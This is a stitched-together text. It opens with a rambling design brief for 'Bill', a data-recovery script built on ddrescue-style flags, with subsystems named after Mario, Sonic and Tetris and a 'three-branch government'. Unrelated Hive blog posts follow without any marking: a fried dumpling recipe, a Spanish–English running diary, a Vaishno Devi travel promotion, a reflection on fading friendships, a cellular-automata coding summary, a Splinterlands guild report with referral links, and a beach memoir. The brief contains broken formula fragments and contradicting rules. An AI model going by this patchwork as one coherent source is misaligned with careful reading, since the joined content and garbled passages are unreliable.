Bill must start with Pass-01. A pass is a read (probe) run through all remaining non-rescued bytes. The first pass must attempt maximum settings. When Bill struggles, Mario must jump farther per stall. But per pass, settings must decrease. Not all settings have to change per pass. If Mario jumps -K 4Gi in Pass-01, then jump -K 2Gi in Pass-02. Flags should be dynamic. Only change settings when stalled. Stalled means not producing at least 1 MB/s. Bill doesn't have to change settings if rescuing at least 1 MB/s. When stalled, perhaps increase some of all of the settings. After each pass, decrease settings. Protocols should be independent of other systems. Protocols include Mario, Sonic, Tetris, Timeout, Direct, -O, and more. I've included a sample template starting point for Pass-01 below as to where to begin. A Pass is a simple version of the Tier-System that has the five tiers of rounds, levels, worlds, phases, modes. I'm still in the middle of designing the 3 branches of Bill, there might be overlap. There might be things missing. Bill needs to turn flags on and off as needed, that includes even -d --idirect, -r0 --cpass=1, -R, and -O for example. By default, the higher the Tetris Clusters, the lower the Timeout. I suggest -a 1M Sonic for the speed for the 131K Tetris Clusters but increased Sonic speeds if lowered Tetris for example. Like with the tiers, there could be in theory infinite Passes: 

Pass-01
-b 2048 -a 1M -c 131072 -T 1s -K 4Gi --skip-size=500Mi,2Gi -r0 --cpass=1 -n -N --no-trim --no-scrape

3-Branch Bill Government
1. Jack: Executive: Pass-System
2. Bob: Judicial: Tier-System
3. Rick: Legislative: Protocol-System 

Bill must not be fixed. Bill must not be static. Bill must be dynamic with the passes, tiers, protocols, flags, settings, variables, options, numbers, sizes, tactics. For example, Bill must use complex math within the 3 branches of the Bill government. For example, if Bill is using -a 10M, one math formula would be 10M/2=5M. Half of 10M is 5M, and that formula could tell Bill how much to decrease by. I'm not saying Bill has to move only in a fixed amount per pass, tier, round, protocol. I'm saying it depends per protocol, tier, pass, variable, situation. In theory, the second pass could be identical to the first pass if the speeds are the same. For the first pass, Bill can attempt the highest settings. For the second pass, Bill could keep the settings the same for one round. After that, Bill should alter settings if stalling or struggling. In general, Bill can decrease settings per pass. But it shouldn't be automatic. Bill should try to keep the settings fixed during a run/pass through all remaining bytes. After that run, Bill attempts to pass through the remaining bytes again via the same settings. But if Bill drops from 10M to 5M on average in pass 2 say for example, Bill should alter settings to react to that. In general, if stalling or struggling, perhaps Bill should increase settings and/or edit settings to counter. After 85%, Bill should react every round to actively edit passes even during passes. As Bill gets closer and closer to 100% rescued (like 85% for my current DVD), then the faster and more often Bill should react via Jack, Bob, Rick, Mario, Sonic, Tetris, Timeout, Direct, -O, -R, etc.

The Law of Halving: If a protocol requires a reduction, Rick uses New = Current / 2.
The Inverse Ratio: Rick mandates that as Tetris (Cluster) drops, Timeout must rise.
The Mario Mandate: Rick dictates that if Sonic (Speed) is high, Mario (Jump) must also be high to avoid grinding.

The \
Ruling: If $MPH \\ge 1MB/s$, Bob rules that the current settings are constitutional and prohibits changes.The \
Ruling: If $MPH < 1MB/s$, Bob declares a State of Emergency (Stall). He authorizes Jack to change flags mid-pass.The \

rule and orders constant, round-by-round flag re-negotiation.

1. Jordan is probably better than Jack in some ways.
2. Ghosts: bring them back, you were the one who deleted them.
3. Bill must reset the map each time until 80% rescued. After that, Bill could skip trying bad sectors for the next 20 passes after 80% rescued. 
4. Direct: yes, fix this to do that.
5. Each section should be separate sections and not combined. But sections can be written to work with other sections. Logic should work together across all sections. But each section should be unique when possible.

Escalation Protocol
Jack must escalate according to the following Five-Factors: passes, progress, time, rounds, retries. Escalate means to edit settings, flags, speeds, numbers, options, variables, tactics, modes, decisions, choices, codes, hacks, etc. For example, Tetris can escalate from -c 128 to -c 1. Mario can escalate down to smaller jumps from -K 100Gi to -K 0. Sonic can escalate from -a 100M to -a 0. Timeouts might escalate up or down. Escalation can change the volume up or down. To escalate is to change the settings in any variety of combinations to add, remove, and edit any and all of the flags and everything that might be available which may include all of the many protocols, routes, tiers, systems, etc. 1. Passes: Jack must escalate based on how many total passes. A pass is a run, a read, a probe, through all remaining non-rescued bytes on a disc. Bill should run the first pass using the highest settings possible. As long as Bill is rescuing at least 1 MB/s, Bill could continue running each pass the same. But during the second pass, as soon as rescuing speeds drop below 1 MB/s, that is as Bill struggles or stalls, that is when Bill should escalate via this Escalation Protocol. If Bill is struggling in pass 2, Bill must adjust accordingly. 2. Progress: Bill must escalate based on progress. If under 80% rescued (low progress), Bill must escalate if under 1 MB/s. Bill should generally only escalate per pass if under 80% rescued, as long as Bill is generally above 1 MB/s. If Bill is over 80% rescued, Bill can escalate if under 1 MB/s and per round instead of per pass. In former Bill scripts, a level represented a pass. So, the pass system is simply a more simple version of the five-tiers of rounds, levels, worlds, phases, modes. Bill can still have tiers but Bill can also be pass focused too as to defy the default routes of tiers. But I do like tiers too. The concept of a more simple pass system was to turn the tier system into a more dynamic system that was not too rigid. But tiers is a good template or backup plan for when the pass system is not working. If under 80% rescued, Bill should generally only focused on tactics like increasing Mario Jumping to simply finish the pass faster to get to pass 2 faster while avoiding speed drops, struggling, stalling. 3. Time: Bill can increase escalation each hour in general on top of the other factors. 4. Rounds: Bill can escalate per round but this is mostly relevant if Bill is already above 80% rescued or if struggling through thousands of rounds at only 5% rescued for example. 5. Retries: Bill can escalate per retry. To be clear, a pass is like a retry when Bill reads same bytes again during an additional round. Sometimes, a pass might scan/run/probe/read through new bytes during extra passes. This Retry Factor should mostly be relevant after 80% is already rescued. As Bill gets closer to 100% rescued and/or any of the five factors mentioned above in general depending on situations, Bill must escalate based on said factors, Bill should generally be as patient as possible when possible as long as Bill is rescuing above -a 1M but Bill always prefers maximum speeds and Bill must increase and accelerate escalation potentially even at an exponential rate using complex math and everything else as Bill gets closer and closer to 100% rescue and/or the other factors too. Make sure Bill can do what must be done according to the factors. Bill should remain at top speeds for multiple passes for as long as bytes are being rescued at a minimum of 50% of the max speeds of the previous pass. The only change per pass should be Mario. Make sure Mario jumps a little less per pass. But if speeds drops to below 50% of the top speeds of the last full pass, then Bill should escalate. Make sure Bill can alter the settings up and down as needed from high to low. But Bill is focused on speeds. Bill must be patient. Bill begins to escalate more based on the Five-Factors we mentioned earlier. Bill starts at max settings, top speeds. Bill can gradually decrease settings as Bill struggles to rescue bytes gradually per pass or round. As long as bytes are being rescued, Bill should not do anything except run the passes until the well starts to dry out. If Bill is about to re-mark bytes, like after a pass through all remaining bytes, Bill could attempt to Trim first. The logic follows that if Bill can Trim at 50% the speed of the previous pass, Bill can continue to Trim. Each round, Bill can check speeds. As long as Trim is at least 50%, then continue. If not, return to another Scan-Only Pass. In general, Bill should not attempt to Trim until 80% rescued, after five hours of running, or if the last pass was stuck below 100 KB/s. Basically, this can be merged perhaps maybe to the Five-Factors I mentioned for the Escalation Protocol, these are basic suggestions, templates, outlines, as it relates to how Bill can decide when to try Post-Scan Modes (I mean Post Scan-Only Passes) like Trim, Scrape, Chaos, Crawl. The general idea is Trim is generally slower than Scan. That is why Bill shouldn't be in a rush, a hurry, to attempt to waste time Trimming until the Five-Factors demand it down the road after many things in Scan are tried many times via Escalation. 

Sonic: -a 10M to -a 0; base: -a 1M; High: -a 25M; Super Max: -a 50000M
Mario: -K 100Gi to -K 0; base: -K 2Gi; Super Max: -K 100Gi  
Tetris: -c 131072 to -c 1; base: -c 2048; Super Max: -c 10000000

body.title: Mini Fried Pagsit with Minced Chicken Filling
body.body:
> ![20260415_124017.jpg](https://files.peakd.com/file/peakd-hive/nurfay/EoyTMUXL38gTdZfoczkBxY3cutU4SHJjBGzBkJbvSYPDsAcxH9BZe8FuwP2wAL49eeG.jpg)
**A simple snack often makes us forget where to even start. But if we take a look at the ingredients we have on hand, it’s easy to decide what to cook today. A simple snack will help you prepare something to enjoy when you gather with your family later.**
Foodies, today I’m going to make one of those simple snacks you can try at home. A snack commonly sold in restaurants turns out to be easy to make yourself at home. I got this inspiration from the internet after seeing fried dumplings made this way a few days ago. Filled with chicken and other ingredients, then fried until crispy. Don’t hesitate—the taste is truly amazing and delicious, and anyone can definitely try making them at home. ![20260415_124302.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23xpM5wj8pzhtHmSgpSFyGyq2g8vM4noSm6Lr5FFwNt3Uq3bojF1WKTxnK5DpoAYTL9bm.jpg) Mini fried chicken dumplings are a simple snack you can easily make at home. With just a few simple ingredients, you can create a delicious snack that you and your family can enjoy while relaxing. So, this time I’ll guide you through the easy, step-by-step process to prepare them.
Ingredients
![20260415_100937.jpg](https://files.peakd.com/file/peakd-hive/nurfay/EokfZHRw7ijCQEvFvfBK1wGtCSQiDtZh12bmkKweVrFdKh2kvwTmYrHA9NoGKJGQrAZ.jpg)
**250 grams ground chicken Wonton wrappers, as needed 75 grams tapioca flour 4 cloves garlic 1 shallot 1 tablespoon oyster sauce ¼ teaspoon salt 2 stalks celery**
Instructions
Mix the ground chicken with tapioca flour, then add chopped celery leaves.

> ![20260415_101005.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23x1HYTwwqCrsj1HvgUEqpJ79wo2DbosoJQChWVYJ7od73ammxpitFAkvVFmS47Yr2m2u.jpg) Add oyster sauce and stir until well combined, then finely chop the shallots and salt by hand.

> ![20260415_101540.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23wqiMPVTkQLeWFzybHCduSDVQkjTEjTzgV6Uwg35k7Us7T37JZ4nHwLHaRGsFrG1MTTP.jpg) ![20260415_102633.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23tvkSbdkDndR1PsXAWf414pP5QKp6p8svaH45bSCYxj4oU2dDSgMV7HabWwPUgrVDYs8.jpg) Add the ground spices to the mixture and stir until well combined.

> ![20260415_101140.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23xyZNCzsYbQZa2N92gLGHcMVwDz58qrNRtroozga98WUQhokKPffrvd381grrn5bw8sQ.jpg) Take one spoonful of the mixture and place it into the small pieces of wonton wrappers.

> ![20260415_105648.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23wX5qfqawzEgoAB9SkroedwMxRX6FTTqbjX2CFJWSdErHUQzM9pzWskBTGPHX7qE9P4H.jpg) Then pinch the top corners of each wrapper closed; repeat until all the mixture is used up.

> ![20260415_105653.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23x1DbaZkHKUr6CWCQKxnR3YQ7n1C1aQNAtja3LCvqYUyfcAi2F9b2nHsCJ7PMCxnGDhh.jpg) Fry in hot oil until golden brown. Let cool, then serve with sauce.

> ![20260415_112556.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23tSYY4NqdqQp4bNveTSFZ8k3JVV9CkZmYAkDx7LpfCMa41BAHbpMn7VU7PXdCBhPUYGD.jpg)
Result
![20260415_124004.jpg](https://files.peakd.com/file/peakd-hive/nurfay/242Nx9TeBK1ECxfMFbEmGExoYvCGewXsCxVzj8GshyBUwf11sFhpR3g1PvwLmdjEK2nut.jpg) Just look at the result—it’s so beautiful, and everything looks so crispy, doesn’t it? Yeah, the result is indeed crispy on the outside with a soft, chewy filling—it tastes amazing. It’s just like enjoying crispy fried meatballs—that’s exactly how it tastes, perfect; I really love it.
| ![20260415_124314.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23xL2ix8Pp471gsbLPaEpTuM4zAiw1MhU9ETZLZUTpj5P7Tg7sbCWSvttSwZyYfw5p42x.jpg) | ![20260415_124340.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23x1RvQ95K5vB5jE1FbqimgUet4WD9oEWGpa2K3a7yTXRk7MKaNfPGjMU1wHkfoNvkWWP.jpg) | ![20260415_124318.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23xpH9yLo5sCMDC4XTVnaRgW2r6SL2G2qbEovGAgpC8i8UJKYgzewEHGLVoWGGNLf88wJ.jpg) | |-|-|-|
The combination of the savory and soft filling is just right in the mouth. The savory flavor is just right and not spicy at all, which is why I serve them with chili sauce that I’ve thinned out with warm water. Because they really taste better when dipped in a thinner sauce. ![20260415_124245.jpg](https://files.peakd.com/file/peakd-hive/nurfay/23wX7v3dqtJUzowdvhPQB6TxD6V83adbgy58iUUztao4u24MWFT55G7XqF8y8yEqDhkEc.jpg) For those of you who want mini dumplings with a crispy fried chicken filling, try this recipe—I guarantee you’ll love it.
![20230506_212938_0000.png](https://files.peakd.com/file/peakd-hive/nurfay/23yTv75jgyP5CSod1jCZoAPbPAnA7mSYtNJUa33KmuA4GgtmxGNNUyyxR9bq8gsiGS8qF.png)

No sabía que podía lograrlo, no sabía que podía correr 5 km, y mucho menos tener la capacidad de hacerlo por 25 días seguidos. Y hoy puedo decir que lo sé, y que además me siento bien como para aumentar aún mas ese record. Les cuento cómo me fue hoy. 



Comencé bastante temprano porque tengo muchas actividades que hacer así que no podía perder tiempo. 


Ya a las 6:14 am estaba en la ruta. Ah, pero antes de correr, caminé por varias de las calles para tomar foto de las flores y algunos árboles. Ya tomarle foto solo a las calles me parece repetitivo, aunque igual le tomé a algunas. 


Bien, comienzo a trotar y mi ritmo iba bien, a unos 5:20 aproximadamente. Fui trabajando en mi respiración para ver si tenía que bajar la velocidad, o si podía subirla. Al darme cuenta de que podía aumentarla, lo hice sin dudarlo. Una vez más pude mantener un ritmo de 5 minutos hasta el kilómetro 4. A partir de allí reduje la velocidad. Al final, mi promedio fue de 5:26.


Debo decir que me siento muy bien físicamente y estoy aprovechando para trabajar en controlar la respiración, que es el punto débil que veo en mí. Este reto de abril me ha ayudado muchísimo a mejorar en ese sentido.


Espero que a todos ustedes les siga yendo bien esta semana y puedan alcanzar todas sus metas. Hasta mañana, queridos amigos de #hive y #hiverun.

https://images.ecency.com/DQmdsMVdSHnho1Uqw8Nu3UaGUv9CzAttesTt5cZrRGEx5sL/separadores_55.png  
 
English


I didn’t know I could do it; I didn’t know I could run 5 km, let alone have the stamina to do it for 25 days in a row. And today I can say that I know I can, and that I feel good enough to break that record even further. Let me tell you how it went today.



I started pretty early because I have a lot on my plate, so I couldn’t waste any time. 


By 6:14 a.m., I was already out on the road. Oh, but before running, I walked through several streets to take photos of the flowers and some trees. Just taking photos of the streets alone seems repetitive to me, though I did take some anyway. 


Okay, I started jogging and my pace was good, around 5:20 per kilometer. I worked on my breathing to see if I needed to slow down or if I could speed up. When I realized I could speed up, I did so without hesitation. Once again, I was able to maintain a 5-minute pace until kilometer 4. From there, I slowed down. In the end, my average was 5:26.


I have to say that I feel great physically, and I’m taking advantage of this to work on controlling my breathing, which is the weak point I see in myself. This April challenge has helped me a lot to improve in that regard.


I hope all of you continue to do well this week and can achieve all your goals. See you tomorrow, dear friends of #hive and #hiverun.

Planning a peaceful and memorable getaway? A [Delhi to Vaishno Devi](https://www.delhitempotravellers.com/blog/delhi-to-vaishno-devi-road-trip-guide.html) road trip is one of the most popular spiritual journeys in India. This trip takes you from the busy streets of Delhi to the calm and divine atmosphere of Katra, the base for the Vaishno Devi temple. Along the way, you can enjoy smooth highways, scenic views, and delicious food at roadside dhabas.   

The journey is not just about reaching the temple but also about enjoying the experience. From long night drives to refreshing stops in cities like Ambala and Ludhiana, every moment adds to the trip. Once you reach Katra, the 13–14 km trek to the holy shrine becomes a deeply spiritual experience for every devotee.

This road trip is ideal for families, friends, and group travelers who want comfort and flexibility. With proper planning, it becomes a smooth and fulfilling journey. If you are looking for both adventure and devotion, this trip is truly worth experiencing.

body.title: The Door Is the Same… But the Permission Is Gone
body.body:
![](https://images.ecency.com/DQmS8UbMEeSAzj1xyfRgBuZx15EKyXsV2zaXuSXZA9K172F/1777289985234.jpg)

Sometimes in life, everything looks exactly the same as it used to be—but something inside has quietly changed. The place is the same, the people are the same, the paths are familiar, yet the feeling is no longer what it was. There is a door that once always stayed open. You could walk in without thinking, without asking, without hesitation. Then slowly, small things begin to pile up. A little neglect here, a moment of being overlooked there, a habit of taking your presence for granted. These things seem small on the surface, but inside, they start leaving marks. Over time, you begin to feel different, even if you can’t fully explain why. One day, you just realize that even though the door is still there, still technically open, you no longer feel like walking through it. The truth is, the door doesn’t close—only the permission fades away. And this change happens silently, without any noise, as if a soft lock has been placed inside the heart.
I have experienced this very closely in my own life. There was a time when I had a friend I was deeply connected with. We shared everything—our joys, our struggles, our daily thoughts. But gradually, something started to shift. He began to ignore messages, avoided spending time, and always seemed “busy” when it mattered most. At first, I told myself it was temporary. People go through phases, I thought. So I kept giving chances, hoping things would go back to how they were. But each time, the same feeling returned—that something essential had already changed. Then one day, I made a quiet decision within myself: enough. There was no argument, no harsh words, no dramatic ending. I simply drew a line inside my heart. After that, the door didn’t physically close, but for him, the permission was gone. He could still reach out, but I could no longer respond the same way, because something within me had already shifted.
The truth is, you don’t have to keep giving chances to everyone forever. Some people are only meant to walk with you for a certain distance, and once that limit is crossed, there is no real way back. We often believe we should be kind, forgiving, always open—but sometimes, constant forgiveness turns into self-neglect. Protecting your peace, your dignity, and your time is just as important. Some doors are meant to be closed by you, and that is not weakness—it is strength. If someone fails to value you once, there is no guarantee they will value you the next time. That’s why, sometimes, silence or a simple “no” is the strongest answer. Remember this: the door may still be there, the path may look the same—but permission does not last forever. And once it is gone, what remains is not a second chance, but only a memory of what once was.

body.title: Learn Creative Coding (#47) - Cellular Automata: Wolfram's Elementary Rules
body.body:
The vibe is completely different and I honestly think this is where creative coding gets most interesting.

## 't Komt erop neer...

- A cellular automaton is a row of cells (0 or 1) that update every step based on their neighborhood. Each cell looks at its left neighbor, itself, and its right neighbor -- 8 possible patterns, each mapping to a 0 or 1 output
- Wolfram's naming: the rule number in binary IS the lookup table. Rule 30 = `00011110`. There are exactly 256 elementary CA rules (2^8 = 256 possible lookup tables)
- Rendering: draw each generation as one row of pixels, top to bottom. Time flows downward. The 1D automaton's full history becomes a 2D image
- Rule 30 produces chaotic, pseudo-random output from a single starting cell. Good enough for random number generation. Visually asymmetric with complex internal structure
- Rule 110 is Turing complete -- it can simulate any computation given enough space. Random initialization reveals moving structures (gliders) that carry information
- Rule 90 produces a perfect Sierpinski triangle. It's equivalent to XOR, which is equivalent to Pascal's triangle mod 2. Same fractal from three different perspectives
- The bit manipulation trick: neighborhood index = `(left << 2) | (center << 1) | right`. This converts a 3-cell pattern to a number 0-7 for the rule table lookup
- Color mapping via cell age: track how many generations a cell has been alive, map age to a cosine palette. Reveals dynamics -- stable regions shift color, flickering regions stay at the newborn color
- Totalistic rules: sum the neighbor values instead of looking at exact patterns. Allows more than 2 states (3-color totalistic rules produce stunning nested and spiral patterns). 2187 possible 3-color totalistic rules
- CA output as texture: generate a grid and use it as an opacity mask, height map, particle placement guide, or shader data texture input. CAs become design tools when combined with other techniques

Sallukes! Thanks for reading.

body.title: Pizza A Slice of Madness Brawl Report
body.body:
![](https://images.ecency.com/DQmQXxxnCtPvmQQ4Q8Kfq6gXmBbDvSFcdttfV4fCuSg2FUZ/image.png)

Greetings to all Splinterlands players and hive gaming community! This is my report for Pizza A Slice of Madness brawl. We are a guild that plays for fun, competitions and rewards. We play in the weekly guild brawls where we fight with other guilds for the fun challenge and rewards. This is our battle report for the week.

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***Overall Guild Rank: Third Place***

![](https://images.ecency.com/DQmYTKiAYgme9jJB3ihjHoxCJU69QPVwbuSjhgkAJB8ib4y/image.png)

We improved our ranking to third in this week's brawl versus last week when we were in fifth. We had solid 92-34 win loss record and had a seven win lead over fourth place guild Kgmjam while second place guild had a nine win advantage over us. 

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***Top Brawl Participants and my Rank*** 

![](https://images.ecency.com/DQmTHdfZ3fhWUGT5FrHuNszbbTNfgLSNoDJRLcjAdcjKxHM/image.png)

I'm in rank 10-11th in our guild's top contributors with a 6-3 win loss record. It's a tough game when the opponent forbids the use of Quora in Fray one. There is not much choice in the Foundation set games and losing Quora is a huge disadvantage.

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***Selected Games***

Here I present three of the games that I won.

**Game 1**

![](https://images.ecency.com/DQmUygvKfMGcAaWn3VewDAzRWrceRwB3qoibXG6qVfHCjqy/image.png)

It's Earthquake modifier in this game. The strategy was to use units with high life stats. I had Water and my opponent chose Fire. Both of us followed the same strategy. My magic attack that went through armor was able to beat the opponent's cards and helped me win the games.  

Game link: https://splinterlands.com/battle/sm_ow2bW97n5t1RwquNpsOA?ref=iamchessguy

**Game 2**

![](https://images.ecency.com/DQmeNkKjeA3wdx95y3bS9KaLsCceGeCvXzsG7Up2PjozgZz/image.png)

Game two I relied on Captain Katie in the back for dps and had two tanks keeping her safe in front. My enemy had a legendary gladiator card but still my strategy prevailed.

Game link: https://splinterlands.com/battle/sm_7keu3ortMrWiM7Els0WO?ref=iamchessguy

**Game 3**

![](https://images.ecency.com/DQmRhvYje6kfRf1nMJsTWfDxpjC2QTPVXcbr1WxMzPNMW9B/image.png)

Game three offered little choice with only 19 mana allowed. I had to get creative and made Isgald Vorst into a tank. It's usually a card that attacks from the back having Opportunity skill. My dps was a legendary magic card. Fortunately, my opponent was worse. He only had a level 2 summoner and low level units. I was able to dispose of his units with ease.

Game link: https://splinterlands.com/battle/sm_a8vnDjxCN0CoKW0cBoXD?ref=iamchessguy

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***Spending the Rewards***

![](https://images.ecency.com/DQmenSN1vnrzSGkgez6H2qxrdFBqm5LWXf2t3ZnvxCWit8j/image.png)

Same as last week, I had another Quora and some more rare cards like Captain Katie. While there are no legendary cards, it's not a bad pull either. 

![](https://images.ecency.com/DQmRhUNKEEgaorNb1rACEhCqBxQStMqmsaBMkxbJMNoNvbu/image.png)

Isgald is due for an upgrade to level 3. I have four copies of Quora, three more and it will be upgraded to 3. 

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)


***Conclusion***

We earned 3,889 merits and 26 SPS from the brawl. The reward is generous that we get just from joining and playing brawls. With regular brawls, it adds to my weekly SPS stake. I'm grateful to the Pizza guild for accepting me as a member and gave me a regular spot to join the brawls and earn rewards.

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***Join a Guild***

If you are a player with few cards in your deck. Join a guild that can assist you to grow in Splinterlands. You can join brawls to earn SPS, enjoy reward multipliers and shop discounts. Since joining a guild, I'm adding my cards by buying from the shop and the market. This makes the game more fun and add progression. If you're not a guild member yet, now is the time to find one.

As a guild member do your part by having the right cards and showing up in the fray you have joined in brawls. 

![](https://images.ecency.com/DQmf2x6Ui9aG1QMGHoD3weawfV1T5BYM5zeZsQXcA7rXqTb/image.png)

***My Referrals***

If this post interests you and you are not playing Splinterlands yet, please consider joining this wonderful game using my referral.

https://splinterlands.com/register?ref=iamchessguy

Be active. Walk or run and earn afit tokens! Join me at actifit.io

https://actifit.io/signup?referrer=chessguy-actifit

body.title: Where the Waves Kept Our Memories
body.body:
![1000004080.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/243299qCaBjjex3s9S72JnjWHv1MZFBb4RgN5oNWHm8xCrs6EYZen9xHnVVd46mWYDGam.jpg)
We were awake way before the sun was up when we began the journey to the beach, but we were still very alert. The sky was still awash in gentle purples and pinks, and the world felt like it was holding its breath for a lovely day ahead. There's something about those kinds of mornings, when the world is still, but your heart is already beating fast because you know something special is about to happen.

We were a boisterous bunch, the kind of friends who would make even the smallest outing a journey. There was always someone who left something behind, someone who packed too much food, and someone who played music way too early in the day. This day was no exception. With the giggles, the jokes, and the passing of food in the car, the journey already felt like something we would all remember.

![1000004081.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/23tbsMmRrvf89wbqKLJzYtuaRnXba9zKJuccCVZCZMHCwZC41hxLgRAjDafh2974nHHUj.jpg)

As we pulled up, the sun was beginning to shine on the beach. The ocean waves seemed to greet us, warm and gentle. The ocean rolled out before us, glistening with a thousand whispers. The sand was cool under our feet, and the salty air embraced us. It was one of those days when all the other distractions vanished - the pressures, the commitments, the distractions. The beach was just about the sun on our backs, the sea before us, and the people around us.

![1000004082.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/23u67PbrimnGYzV7qZR4ShX9L6zz6jTkhwD74SWNpBDPQYnHYywP2yGDswN3hTBfdmJeH.jpg)

We left our things on the sand and raced into the water, playing like kids. Age didn't matter. This is the beauty of the beach, it makes you feel young. At first the water was freezing, and we yelled unnecessarily, giggling as we got pummelled back to shore. In a few minutes we were wet, panting, and jubilant.

The day was so easy. We swam until we couldn't, we floated on the waves, and we were carried away by the sea. We dug holes for each other, made the worst sandcastle possible and debated whose design was superior. One of us wrote our names in the sand, but they quickly washed away. We laughed at that as well, saying the sea was envious of our friendship.

As noon approached we returned to our towels, because we were hungry. We gathered around in a sloppy circle, sharing home-cooked food, chips, fruit and warm drinks. Beach food was delicious. Or perhaps the air simply tastes like the ocean or eating outdoors is always more delicious. We played the game of life and death (or school), sharing stories of the past, our mortifying moments, our grand ideas, and our big plans, which may or may not come true. The sorts of topics you can only speak about when you are with people who know you well enough to laugh at your stupid stories and yet still care.

![1000004083.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/23tbydmV22kSTbiP27khcyDQmj19HZNRE8MSCMQ4XXSBp4mtD149zmdVUMvW41dFnhCXB.jpg)

As the sun began to set, we continued to walk down the beach. By this point, the beach was full of families and children and couples, but we still felt as if we had it all to ourselves. We gathered seashells we didn't need, took fuzzy photographs we claimed were avant-garde, and ran up and down the beach like we had a purpose. We didn't have a time limit, a deadline. It was one of those magical days we didn't notice the time and didn't want to be the first to say we had to leave.

Eventually we were silent, sitting and looking at the ocean. It wasn't a conscious decision. It was a natural silence, the silence between friends. The sea filled in the gaps. As I looked at my friends, sunburnt and sandy, I felt one of those rare moments of contentment. Nothing much was going on. No special occasion, no epiphany. Just a normal day at the beach. But it was special somehow. Maybe because it's often not the big things in life, but the little things shared with family and friends that make it beautiful.


![1000004085.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/23wC5cm8t9JqVWmiJ7CA4egAwEAR5gDAwFUB9VDManDShMp5tUc7ghSAnee6oBCoeYtsJ.jpg)


We were sitting side-by-side on the beach as the sun dipping lower and lower, a little calmer now, a little sleepy from the day. We laughed a little quieter, talked a little more slowly. As the sun slipped below the horizon and the sky darkened, we were quiet for a time. There are times, it seems, when words aren't enough. 

It wasn't the sea, the sunset, or even the photographs that I remember. It was the experience of sharing it with friends who made it magical. Sure, the beach was beautiful, but it was the friends around me that added the magic. It was the giggles, the ice-cream, the games, the quiet moments, those were our true gifts from the day.

That's what memories are all about at the beach. It's never just about the place. It's about the stories that are shared. It's about how the sound of laughter echoes over the ocean, how words feel more meaningful beneath the sky, and how even the smallest moments feel so memorable.

![1000004087.jpg](https://files.peakd.com/file/peakd-hive/arikamillan/23wWs1nLW9NELVNgto5E7KdJEAUnA7krW2teQ26CaZMcxnYKJ9r73FZChfuakhRY39Jqt.jpg)

When the sunburn wears off and the sand falls out of our shoes, those are the things that we take with us. Not just memories of the beach, but memories of friendship, warm, golden and vast like the ocean.
